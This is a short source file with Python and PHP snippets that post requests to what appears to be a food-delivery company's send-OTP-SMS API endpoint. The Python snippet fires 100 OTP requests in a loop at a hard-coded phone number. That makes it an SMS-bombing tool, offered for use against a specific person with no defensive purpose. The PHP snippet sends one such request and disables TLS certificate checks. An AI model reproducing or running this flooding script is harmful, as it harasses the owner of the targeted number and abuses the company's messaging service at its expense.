import requests
from requests.structures import CaseInsensitiveDict

url = "https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"

data = '{"mobileNumber":"6297420083"}'

for i in range(100):
        resp = requests.post(url, headers=headers, data=data)

        print(resp.status_code)
        
        
///<?php

$url = "https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobileNumber":""}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);
var_dump($resp);

?>

///

